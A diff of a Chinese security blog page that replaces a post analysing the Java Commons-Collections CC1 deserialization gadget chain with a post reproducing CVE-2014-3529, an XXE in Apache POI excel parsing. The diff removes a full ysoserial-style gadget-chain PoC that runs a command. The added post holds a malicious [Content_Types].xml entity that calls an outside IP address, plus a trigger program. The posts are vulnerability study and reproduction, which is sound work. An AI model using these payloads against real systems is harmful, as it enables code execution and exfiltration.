@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>java反序列化CC1-2 | fmyyy</title>
+  <title>解析excel文件引起的xxe | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
+  <meta name="description" content="解析excel文件引起的xxe老洞了 分析复现一下。 编号 CVE-2014-3529 需要poi-ooxml-3.10-FINAL.jar以下版本 复现Microsoft Office 从 2007 版本引入了新的开放的 XML 文件格式，新的 XML 文件格式基于压缩的 ZIP 文件格式规范，由许多部分组成。 把一个excel文件解压就能看到。  对[Content_Types].xml写入p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java反序列化CC1-2">
-<meta property="og:url" content="https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/index.html">
+<meta property="og:title" content="解析excel文件引起的xxe">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/01/18/%E8%A7%A3%E6%9E%90excel%E5%BC%95%E8%B5%B7%E7%9A%84xxe/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
+<meta property="og:description" content="解析excel文件引起的xxe老洞了 分析复现一下。 编号 CVE-2014-3529 需要poi-ooxml-3.10-FINAL.jar以下版本 复现Microsoft Office 从 2007 版本引入了新的开放的 XML 文件格式，新的 XML 文件格式基于压缩的 ZIP 文件格式规范，由许多部分组成。 把一个excel文件解压就能看到。  对[Content_Types].xml写入p">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2021-09-02T13:14:04.000Z">
-<meta property="article:modified_time" content="2021-09-22T01:29:43.969Z">
+<meta property="article:published_time" content="2022-01-18T13:14:04.000Z">
+<meta property="article:modified_time" content="2022-01-19T17:07:15.829Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">java反序列化CC1-2</h1>
+                <h1 class="kratos-entry-title text-center">解析excel文件引起的xxe</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-09-02</li>
+                <li><i class="fa fa-calendar"></i> 2022-01-18</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~3.32K
+                        1150
                     
                     字
                 </li>
@@ -190,25 +190,37 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1632274183969"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1642612035829"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-number">1.</span> <span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90excel%E6%96%87%E4%BB%B6%E5%BC%95%E8%B5%B7%E7%9A%84xxe"><span class="toc-number">1.</span> <span class="toc-text">解析excel文件引起的xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
                 </div>
             
             <hr />
-            <p>﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？<br>看看p神给的poc</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>不过这个poc我本地算是弹失败了，因为java版本的原因，在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用。我的版本正好是8u71。<br>不过我来学习思路，也懒的改版本了。</p>
-<h2 id="sun-reflect-annotation-AnnotationInvocationHandler"><a href="#sun-reflect-annotation-AnnotationInvocationHandler" class="headerlink" title="sun.reflect.annotation.AnnotationInvocationHandler"></a>sun.reflect.annotation.AnnotationInvocationHandler</h2><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可 以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。<br>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler<br>源码就不放了，逻辑就是调用了setValue方法，这个方法也能触发TransformedMap里注册的<br>Transform。</p>
-<h2 id="关于反射的问题"><a href="#关于反射的问题" class="headerlink" title="关于反射的问题"></a>关于反射的问题</h2><p>看到前面我们生产Runtime类的时候是直接调用getRuntime方法的<br>[<img src="https://img-blog.csdnimg.cn/img_convert/5d12afa2cd8fbf46ca0f305c5210fbe3.png"></p>
-<p>但这次的poc不一样，是利用反射调用的</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/5f88e181dadd76d98e0d386aad425ca2.png"></p>
-<p>这里涉及到反序列化的条件。<br>1、该类必须直接实现java.io.Serializable接口或者间接从其继承树中实现该接口(也就是他的某个父类实现了这个接口);<br>2、对于该类的所有无法序列化的属性(本文指字段field, 而不是严格意义上的属性property, 下同)必须使用transient修饰。</p>
-<p>但Runtime类是没有实现java.io.Serializable接口的，所以不能直接反序列化，但反射能解决这个问题，将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个<br>java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p>
-<p>但是AnnotationInvocationHandler 也不能直接实例化，仍然需要利用反射的机制</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>真累，接下来是CC1的LazyMap，比起TransformedMap似乎LazyMap用的更多</p>
+            <h1 id="解析excel文件引起的xxe"><a href="#解析excel文件引起的xxe" class="headerlink" title="解析excel文件引起的xxe"></a>解析excel文件引起的xxe</h1><p>老洞了 分析复现一下。</p>
+<p>编号 CVE-2014-3529</p>
+<p>需要poi-ooxml-3.10-FINAL.jar以下版本</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>Microsoft Office 从 2007 版本引入了新的开放的 XML 文件格式，新的 XML 文件格式基于压缩的 ZIP 文件格式规范，由许多部分组成。</p>
+<p>把一个excel文件解压就能看到。</p>
+<p><img src="https://img.le1a.com/2022/01/18/8317512ff665e.png" alt="1642494063501.png"></p>
+<p>对[Content_Types].xml写入poc之后再压缩回去</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANYTHING</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://124.70.40.5:1234&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%test;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.usermodel.XSSFWorkbook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">excel2xxe</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, FileNotFoundException </span>&#123;</span><br><span class="line">        File execFile = <span class="keyword">new</span> File(<span class="string">&quot;/Users/fmyyy/Desktop/blog/test/poc.xlsx&quot;</span>);</span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(execFile);</span><br><span class="line"></span><br><span class="line">        XSSFWorkbook workbook = <span class="keyword">new</span> XSSFWorkbook(in);</span><br><span class="line"><span class="comment">//        XSSFSheet sheet = workbook.getSheetAt(0);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img.le1a.com/2022/01/18/9660acf151107.png" alt="1642504059259.png"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>肯定是在解析xml文件时出了问题。</p>
+<p>在getPartsImpl()方法里</p>
+<p><img src="https://img.le1a.com/2022/01/18/2fe16bf9af913.jpeg" alt="1642506751379.jpeg"></p>
+<p><img src="https://img.le1a.com/2022/01/18/971ab69559bc2.png" alt="1642506804875.png"></p>
+<p>对excel文件解析之后匹配到[Content_Types].xml之后将数据流作为ZipContentTypeManager这个类构造函数的参数</p>
+<p><img src="https://img.le1a.com/2022/01/18/d2babb30b3e9f.png" alt="1642507050096.png"></p>
+<p>进入ContentTypeManager方法之后调用parseContentTypesFile</p>
+<p><img src="https://img.le1a.com/2022/01/18/897de8ddbfec2.png" alt="1642507131910.png"></p>
+<p>该方法对xml数据没有作任何的过滤直接解析导致了xxe</p>
 
         </div>
         
@@ -262,7 +274,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/",
+                text: "https://fmyyy.gitee.io/2022/01/18/%E8%A7%A3%E6%9E%90excel%E5%BC%95%E8%B5%B7%E7%9A%84xxe/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -274,10 +286,12 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/";
-            const title         = "「java反序列化CC1-2」";
-            const excerpt       = `﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc
-1234567891011121314151617181920212223242526272829303132333435363...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/01/18/%E8%A7%A3%E6%9E%90excel%E5%BC%95%E8%B5%B7%E7%9A%84xxe/";
+            const title         = "「解析excel文件引起的xxe」";
+            const excerpt       = `解析excel文件引起的xxe老洞了 分析复现一下。
+编号 CVE-2014-3529
+需要poi-ooxml-3.10-FINAL.jar以下版本
+复现Microsoft Office 从 2007 版本引入了新的开放的 XML 文...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -299,7 +313,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-09-22</span>
+                <span>最后编辑：2022-01-20</span>
                 </div>
             </div>
         </footer>
@@ -308,12 +322,12 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" java反序列化CC1-1" href="/2021/09/01/java反序列化CC1-1/">&lt; 上一篇</a>
+                <a title=" CVE-2019-14439以及[NPUCTF2020]EzShiro复现" href="/2021/12/22/CVE-2019-14439/">&lt; 上一篇</a>
             </div>
             
             
             <div class="nav-next clearfix">
-                <a title=" java反序列化CC1-3" href="/2021/09/03/java反序列化CC1-3/">下一篇 &gt;</a>
+                <a title=" java类加载机制" href="/2022/01/19/java类加载机制/">下一篇 &gt;</a>
             </div>
             
         </nav>
@@ -356,7 +370,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90excel%E6%96%87%E4%BB%B6%E5%BC%95%E8%B5%B7%E7%9A%84xxe"><span class="toc-text">解析excel文件引起的xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li></ol></li></ol>
     </div>
 </aside>
                 
